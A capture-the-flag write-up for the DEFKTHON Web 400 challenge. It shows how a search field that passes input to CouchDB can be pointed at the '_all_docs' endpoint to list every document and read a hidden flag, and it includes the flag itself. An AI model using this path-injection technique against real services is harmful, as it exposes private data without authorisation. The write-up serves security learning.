# DEFKTHON CTF: Web 400

**Description:**

> [Search Me](http://54.201.96.212:888/web400/web_search.php)

## Write-up

The `web_search.php` endpoint contains a form, and (by default) displays the following error message:

```
Error: Document ID is empty (errcode=0)
```

Let’s enter `test` in the search field and submit the form. [The response](http://54.201.96.212:888/web400/web_search.php?submit=Submit&search=test) contains:

```
Error: Object Not Found - missing (GET /astro_users/test []) (errcode=404)
```

[This error message format](https://www.google.com/search?q=%22Object%20Not%20Found%20-%20missing%22) is a hint that CouchDB is used.

CouchDB has [an `_all_docs` endpoint](http://couchdb.readthedocs.org/en/latest/api/database/bulk-api.html#get--db-_all_docs) that returns a list of all available documents in the database, in JSON format. (Note: [`_changes`](http://couchdb.readthedocs.org/en/latest/api/database/changes.html) could be used as well.) [Let’s take a look](http://54.201.96.212:888/web400/web_search.php?submit=Submit&search=_all_docs):

```
stdClass Object
(
    [total_rows] => 3
    [offset] => 0
    [rows] => Array
        (
            [0] => stdClass Object
                (
                    [id] => flag_for_l33ts
                    [key] => flag_for_l33ts
                    [value] => stdClass Object
                        (
                            [rev] => 4-f9d777fcf20c3fc52943aeba961593e9
                        )

                )

            [1] => stdClass Object
                (
                    [id] => userid1
                    [key] => userid1
                    [value] => stdClass Object
                        (
                            [rev] => 3-3125d533dea89836adec3b8a5a652030
                        )

                )

            [2] => stdClass Object
                (
                    [id] => userid2
                    [key] => userid2
                    [value] => stdClass Object
                        (
                            [rev] => 5-0090aa4c0db1f8d52a74d6134b2e48ef
                        )

                )

        )

)
```

`flag_for_l33ts` sounds interesting. [Let’s check it out](http://54.201.96.212:888/web400/web_search.php?submit=Submit&search=flag_for_l33ts):

```
stdClass Object
(
    [_id] => flag_for_l33ts
    [_rev] => 4-f9d777fcf20c3fc52943aeba961593e9
    [flag_for_l33ts_only] => flag{here_you_go_nice_solving_webChalLenges}
)
```

The flag is `here\_you\_go\_nice\_solving\_webChalLenges`.

## Other write-ups and resources

* <http://tasteless.eu/2014/03/defkthon-ctf-2014-web200-web300-and-web400-writeup/>
